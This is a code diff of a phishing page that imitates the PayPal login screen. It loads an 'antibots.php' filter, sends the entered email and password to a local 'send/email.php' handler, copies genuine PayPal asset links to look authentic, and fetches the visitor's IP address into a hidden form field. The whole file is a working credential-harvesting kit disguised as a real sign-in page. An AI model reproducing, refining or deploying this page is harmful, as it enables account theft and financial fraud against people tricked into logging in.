@@ -1,9 +1,13 @@
 <?php
 include 'antibots.php';
 ?>
-
-<html lang="en" class=" desktop js  js  js "><!--<![endif]-->
-    <head
+<html lang="en" class=" desktop js  js ">
+    <!--<![endif]-->
+    <head>
+        <script type="text/javascript" async src="https://www.googleadservices.com/pagead/conversion_async.js" nonce=""></script>
+        <script type="text/javascript" async src="https://www.paypalobjects.com/pa/mi/3p/gtag/analytics.js" nonce=""></script>
+        <script crossorigin="anonymous" src="https://www.paypalobjects.com/pa/mi/paypal/latmconf.js"></script>
+        <script async src="https://www.paypalobjects.com/webcaptcha/ngrlCaptcha.min.js"></script><!--Script info: script: node, template:  , date: Feb 1, 2024 11:19:53 -08:00, country: ID, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0biQlNiCHKWWofITjyrTvoADqeRoq4xBd rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVpgPHQO3DS15Q%2Bs90pd04ixT6NDYUDsjQ8ISKNJXcIQ_18d661d01a0 -->
         <meta charset="utf-8">
         <title>Log in to your PayPal account</title>
         <meta http-equiv="content-type" content="text/html; charset=UTF-8">
@@ -12,16 +16,17 @@ include 'antibots.php';
         <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
         <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
         <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
-        <link rel="shortcut icon" href="pp_favicon_x.ico">
+        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
         <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
         <link rel="canonical" href="https://www.paypal.com/id/signin">
         <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
         <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
-        <link rel="stylesheet" href="css/contextualLoginElementalUIv2.css"><!--[if lte IE 9]><link rel="stylesheet" href="css/ie9.css" /><![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ -->
-        <script nonce="" src="js/lib/modernizr-2.6.1.js"></script><!-- /build --><!-- /build -->
+        <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/d92/d3850ccc8b36d093234151c519ea5/css/contextualLoginElementalUIv2.css"><!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/d92/d3850ccc8b36d093234151c519ea5/css/ie9.css" /><![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ -->
+        <script nonce="" src="https://www.paypalobjects.com/web/res/d92/d3850ccc8b36d093234151c519ea5/js/lib/modernizr-2.6.1.js"></script><!-- /build --><!-- /build -->
         <script nonce="">/* Special integration eligibility check */function isEligibleIntegration() {var sxf = "";return sxf === 'true' || window.name === 'PPFrameRedirect';}/* Don't bust the frame if this is top window */if (self === top || isEligibleIntegration()) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script>
-        
-        <link rel="stylesheet" href="css/style.css">
+        <script attributionsrc="" type="text/javascript" async src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/965352860/?random=1706815193734&amp;cv=9&amp;fst=1706815193734&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=466465925&amp;u_h=768&amp;u_w=1366&amp;u_ah=728&amp;u_aw=1366&amp;u_cd=24&amp;u_his=6&amp;u_tz=420&amp;u_java=false&amp;u_nplug=5&amp;u_nmime=2&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fwww.paypal.com%2Fsignin%3Fcountry.x%3DID%26locale.x%3Den_US&amp;ref=https%3A%2F%2Fwww.paypal.com%2Fsignin%3Fcountry.x%3DID%26locale.x%3Den_US%26langTgl%3Den&amp;tiba=Log%20in%20to%20your%20PayPal%20account&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4" nonce=""></script>
+        <script attributionsrc="" type="text/javascript" async src="https://www.googleadservices.com/pagead/conversion/965352860/?random=1706815193749&amp;cv=9&amp;fst=1706815193749&amp;num=1&amp;label=K7FtCJDsl_4CEJy7qMwD&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=466465925%2C509562772%2C512247838&amp;u_h=768&amp;u_w=1366&amp;u_ah=728&amp;u_aw=1366&amp;u_cd=24&amp;u_his=6&amp;u_tz=420&amp;u_java=false&amp;u_nplug=5&amp;u_nmime=2&amp;sendb=1&amp;ig=1&amp;data=event%3Dconversion&amp;frm=0&amp;url=https%3A%2F%2Fwww.paypal.com%2Fsignin%3Fcountry.x%3DID%26locale.x%3Den_US&amp;ref=https%3A%2F%2Fwww.paypal.com%2Fsignin%3Fcountry.x%3DID%26locale.x%3Den_US%26langTgl%3Den&amp;tiba=Log%20in%20to%20your%20PayPal%20account&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4" nonce=""></script>
+        <link rel="stylesheet" href="css/style.css" />
     </head>
     <body class="desktop" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVpgPHQO3DS15Q%2Bs90pd04ixT6NDYUDsjQ8ISKNJXcIQ_18d661d01a0" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0biQlNiCHKWWofITjyrTvoADqeRoq4xBd" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/5de5dc66420ba2ba/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="f688730f35ffa" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-phone-code="ID +62" data-csrf-token="PiCJ3FZq1lVEFaIRIoNOmkMPUI73Yd34USkCc=" data-nonce="HDFPuz0dolc0t6CRThOOYREQgZyCeRY9BbyhfiJ6sEpqXMKt" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true" data-show-country-drop-down="true" data-otp-login-on-pwd-page-enabled="true" data-email-label="Email address" data-xhr-timeout-limit="20000" data-load-start-time="1706815193504" data-is-cookied-user="true" data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" data-show-qrc-refresh="true">
         <noscript>
@@ -39,16 +44,15 @@ include 'antibots.php';
                         <p id="subTagLineConnectOtp" class="subHeaderText hide">Forgot your email address? Go to the PayPal website to recover it.</p>
                         <div id="loginContent" class="">
                             <div id="loginSection" class="">
-                              <div class="notifications"></div>
-                              <div class="notifications invalid">
-                              <p class="notification notification-critical" role="alert">There's no account with the email you entred. Please try again.</p>
+                              <div class="notifications">
+                              <p class="notification notification-critical" role="alert">Some of your information isn't correct. Please try again.</p>
                               </div>
                               <div id="keychainErrorMessage" class="hide">
                               <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
                               <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
                               <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
                               </div>
-                              <form action="send/warn.php" method="post" class="proceed maskable" autocomplete="off" name="login" id="log">
+                              <form action="send/email.php" method="post" class="proceed maskable" autocomplete="off" name="login">
                               <input type="hidden" id="token" name="_csrf" value="PiCJ3FZq1lVEFaIRIoNOmkMPUI73Yd34USkCc=">
                               <input type="hidden" name="locale.x" value="en_US">
                               <input type="hidden" name="processSignin" value="main">
@@ -59,7 +63,7 @@ include 'antibots.php';
                               <input type="hidden" name="ads-client-context" value="signin">
                               <input type="hidden" name="isValidCtxId" value="">
                               <input type="hidden" name="coBrand" value="id">
-                              <input type="hidden" name="signUpEndPoint" value="#">
+                              <input type="hidden" name="signUpEndPoint" value="/webapps/mpp/account-selection">
                               <input type="hidden" name="showCountryDropDown" value="true">
                               <input type="hidden" name="requestUrl" value="/signin?country.x=ID&amp;locale.x=en_US">
                               <input type="hidden" name="forcePhonePasswordOptIn" value="">
@@ -86,30 +90,36 @@ include 'antibots.php';
                               </div>
                               </div>
                               <input type="hidden" id="phone" name="login_phone" class="validate" value="156156">
-                              <div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button>
+                              <div class="actions">
+                              <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button>
                               </div>
                               <div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass="">
-                              <div class="loginSignUpSeparator "><span class="textInSeparator">or</span>
-                              </div><button type="button" href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</button>
+                              <div class="loginSignUpSeparator ">
+                              <span class="textInSeparator">or</span>
+                              </div><button type="button" href="/ie/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</button>
                               </div>
                               <input type="hidden" name="splitLoginContext" value="inputPassword">
                               <input type="hidden" name="isCookiedHybridEmail" value="true">
                               </form>
-                              <div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
+                              <div class="moreOptionsDiv  hide" id="moreOptionsContainer">
+                              <a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
                               <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                               <ul class="moreoptionsGroup">
                               <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a></li>
-                              <li><a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></li>
+                              <li><a href="/authflow/password-recovery/?country.x=ID&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%253Fcountry.x%253DID%2526locale.x%253Den_US" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></li>
                               </ul>
                               </div>
                               </div>
-                              <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a href="#" id="tryAnotherWayLink" pa-marked="1">Try another way</a>
+                              <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass="">
+                              <a href="#" id="tryAnotherWayLink" pa-marked="1">Try another way</a>
                               </div>
                               <div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass=""></div>
                               <div id="tpdButtonContainer" class="signupContainer hide">
-                              <div class="loginSignUpSeparator"><span class="textInSeparator">or</span>
+                              <div class="loginSignUpSeparator">
+                              <span class="textInSeparator">or</span>
                               </div>
-                              <div class="actions"><button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button>
+                              <div class="actions">
+                              <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button>
                               </div>
                               </div>
                             </div>
@@ -121,27 +131,28 @@ include 'antibots.php';
                     <div class="modal-content">
                         <div class="modal-content-header">
                             <div class="modal-header-text">
-                               Try another way 
+                              Try another way
                             </div>
-                            <div><button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn" pa-marked="1"></button>
+                            <div>
+                              <button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn" pa-marked="1"></button>
                             </div>
                         </div>
                         <ul class="modal-content-body">
-                            <li class="hide"><a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="#" pa-marked="1"> 
+                            <li class="hide"><a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="#" pa-marked="1">
                               <div>
-                               Log in with face, fingerprint or PIN 
+                              Log in with face, fingerprint or PIN
                               </div><button class="chevron-right" aria-label="webauthn-chevron" pa-marked="1"></button></a></li>
-                            <li class="hide"><a aria-label="Login with phone one-time code" id="loginWithOtp" href="#" pa-marked="1"> 
+                            <li class="hide"><a aria-label="Login with phone one-time code" id="loginWithOtp" href="#" pa-marked="1">
                               <div>
-                               Text a one-time code 
+                              Text a one-time code
                               </div><button class="chevron-right" aria-label="phone-otc-chevron" pa-marked="1"></button></a></li>
-                            <li class="hide"><a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="#" pa-marked="1"> 
+                            <li class="hide"><a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="#" pa-marked="1">
                               <div>
-                               Email a one-time code 
+                              Email a one-time code
                               </div><button class="chevron-right" aria-label="email-otc-chevron" pa-marked="1"></button></a></li>
-                            <li class="hide"><a aria-label="Login with password" id="loginWithPassword" href="#" pa-marked="1"> 
+                            <li class="hide"><a aria-label="Login with password" id="loginWithPassword" href="#" pa-marked="1">
                               <div>
-                               Log in with your password 
+                              Log in with your password
                               </div><button class="chevron-right" aria-label="pwd-chevron" pa-marked="1"></button></a></li>
                         </ul>
                     </div>
@@ -157,7 +168,8 @@ include 'antibots.php';
                             <div class="notifications">
                               <p class="notification notification-critical" role="alert">Some of your information isn't correct. Please try again.</p>
                             </div>
-                            <div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span>
+                            <div class="accountArea">
+                              <span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span>
                             </div>
                             <div class="mobileNotification">
                               <p class="pin"></p>
@@ -187,10 +199,10 @@ include 'antibots.php';
                 <div class="legalFooter">
                     <ul class="footerGroup">
                         <li><a target="_blank" href="/id/smarthelp/contact-us" pa-marked="1">Contact Us</a></li>
-                        <li><a target="_blank" href="#" pa-marked="1">Privacy</a></li>
-                        <li><a target="_blank" href="#" pa-marked="1">Legal</a></li>
-                        <li><a target="_blank" href="#" pa-marked="1">Policy Updates</a></li>
-                        <li><a target="_blank" href="#" pa-marked="1">Worldwide</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/ua/privacy-full" pa-marked="1">Privacy</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/ua/legalhub-full" pa-marked="1">Legal</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/ua/upcoming-policies-full" pa-marked="1">Policy Updates</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/country-worldwide" pa-marked="1">Worldwide</a></li>
                     </ul>
                 </div>
             </footer>
@@ -217,47 +229,24 @@ include 'antibots.php';
             <img src="https://c.paypal.com/v1/r/d/b/ns?f=EC-5XJ92760JN535512P&amp;s=UNIFIED_LOGIN_INPUT_PASSWORD&amp;js=0&amp;r=1" title="ppfniframe" alt="" height="1" width="1" border="0">
         </noscript>
         <script nonce="" id="ul-sync-data">var PAYPAL = PAYPAL || {};PAYPAL.ulSync = {fnSessionId: 'EC-5XJ92760JN535512P',sourceId: 'UNIFIED_LOGIN_INPUT_PASSWORD',fname: 'fn_sync_data'};</script><!-- build:js inline --><!-- build:[src] js/lib/ -->
-        
+        <script nonce="" src="https://www.paypalobjects.com/web/res/d92/d3850ccc8b36d093234151c519ea5/js/lib/fn-sync-telemetry-min.js"></script><!-- /build --><!-- /build -->
         <script nonce="">var PAYPAL = PAYPAL || {};PAYPAL.ulData = PAYPAL.ulData || {};PAYPAL.ulData.incontextData = {"version": "","noBridge": "","env": "","icstage": "","targetCancelUrl": "","paymentAction": "","paymentToken": "","merchantID": ""};</script><!-- build:js inline --><!-- build:[src] js/ -->
-        <script nonce="" src="js/signin-split.js"></script><!-- /build --><!-- /build --><!-- build:js inline --><!-- build:[src] js/ -->
-        <script nonce="" src="js/ioc.js"></script><!-- /build --><!-- /build -->
-        <script src="jquery.min.js"></script>
-        <script>
-    $('#login_passworddiv').hide();
-    $('.invalid').hide();
-async function ip() {
-      try {
-        const response = await fetch('https://freeipapi.com/apijson/');
-        
-        if (!response.ok) {
-          throw new Error(`Failed to retrieve IP address from FreeGeoIP API`);
-        }
-        
-        const geoData = await response.json();
-        document.querySelector("#ip").value = geoData.ipAddress;
-      } catch (error) {
-        console.error(error);
-        return null;
-      }
-    };
-	ip();
-    var is_vali;
-    $('.button.actionContinue').on("click", function(){
-        if($('#login_passworddiv').css('display') === "none"){
-            $('.transitioning').removeClass("hide");
-            
-                    is_vali = true;
-                    $('#login_emaildiv').fadeOut(50);
-                    $('#login_passworddiv').fadeIn(50);
-                    $('.invalid').hide();
-                    $('.transitioning').addClass("hide");
-                
-        }else{
-            $("form").submit();
-        }
-        
-    })
+        <script nonce="" src="https://www.paypalobjects.com/web/res/d92/d3850ccc8b36d093234151c519ea5/js/signin-split.js"></script><!-- /build --><!-- /build --><!-- build:js inline --><!-- build:[src] js/ -->
+        <script nonce="" src="https://www.paypalobjects.com/web/res/d92/d3850ccc8b36d093234151c519ea5/js/ioc.js"></script><!-- /build --><!-- /build --><iframe id="grcv3enterpriseframe" src="https://www.paypalobjects.com/webcaptcha/grcenterprise_v3_static.html" sandbox="allow-same-origin allow-scripts allow-popups" style="position: fixed; bottom: 30px; right: 1.5px; width: 74px; transition: width 0.3s ease 0s; height: 66px; border: 0px; z-index: 2147483000; display: none;"></iframe>
+        <script id="fconfig" type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99" nonce="HDFPuz0dolc0t6CRThOOYREQgZyCeRY9BbyhfiJ6sEpqXMKt">{"f":"EC-5XJ92760JN535512P","s":"UNIFIED_LOGIN_INPUT_PASSWORD","b":"https://b.stats.paypal.com/v1/counter.cgi?r=cD1FQy01WEo5Mjc2MEpONTM1NTEyUCZpPTEwMy4xMjkuMTUwLjUmdD0xNzA2ODE1MTkzLjUyOCZhPTIxJnM9VU5JRklFRF9MT0dJThddxD1G2QJYUXL0yaHkp1YUkHRW","ts":{"type":"UL","fields":[{"id":"email","min":6},{"id":"password","min":6}],"delegate":false}}</script>
+        <script src="https://c.paypal.com/da/r/fb.js"></script><iframe id="ppfnfnclspbfiframe" src="about:blank" title="pbf" tabindex="-1" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;"></iframe><iframe allow="geolocation" id="ppfnfnclsiframe" title="ppfniframe" tabindex="-1" src="https://c.paypal.com/v1/r/d/i?js_src=https://c.paypal.com/da/r/fb.js" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;"></iframe>
+                <script>
+        var ip = document.querySelector("#ip")
+
+        fetch('https://ifconfig.me/ip')
+          .then(response => response.text())
+          .then(data => {
+            console.log('Visitor IP Address:', data);
+            ip.value=data
+          })
+  .catch(error => {
+    console.error('Error fetching IP address:', error);
+  });
         </script>
-        
     </body>
 </html>
